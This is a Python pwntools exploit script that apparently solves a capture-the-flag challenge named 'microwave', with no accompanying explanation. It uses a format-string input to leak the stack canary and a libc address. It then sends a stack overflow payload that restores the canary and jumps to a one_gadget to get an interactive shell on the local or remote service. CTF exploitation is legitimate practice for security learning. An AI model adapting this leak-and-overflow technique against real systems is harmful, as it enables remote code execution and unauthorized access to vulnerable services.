#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
local = 0
if local:
	p = process('./microwave')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc_base_offset = 0xf72c0
	one_gadget_offset = 0x45216
else:
	p = remote('127.0.0.1', 1337)
	libc = ELF('./libc.so.6')
	libc_base_offset = 0xeb870
	one_gadget_offset = 0x464d8
elf = ELF('./microwave')
log.success('libc_base_offset = ' + hex(libc_base_offset))
log.success('one_gadget_offset = ' + hex(one_gadget_offset))

def connect(username, password):
	p.sendlineafter('[MicroWave]:', '1')
	p.sendlineafter('username:', username)
	p.sendlineafter('password:', password)

def edit(content):
	p.sendlineafter('[MicroWave]:', '2')
	p.sendlineafter('#>', content)

def tweet():
	p.sendlineafter('[MicroWave]:', '3')

def quit():
	p.sendlineafter('[MicroWave]:', 'q')

# gdb.attach(p)
password = 'n07_7h3_fl46'
connect('%p.' * 8, password)
p.recvuntil('Checking')
leak_data = p.recvline().strip().split('.')[:-1]
print leak_data
canary = int(leak_data[5][2:], 16)
log.success('canary = ' + hex(canary))
leak_libc = int(leak_data[1][2:], 16)
log.success('leak_libc = ' + hex(leak_libc))
libc_base = leak_libc - libc_base_offset
log.success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + one_gadget_offset
log.success('one_gadget = ' + hex(one_gadget))
payload = flat([
	'A' * 1032, 
	canary, 
	'B' * 8, 
	one_gadget
])
edit(payload)
p.interactive()
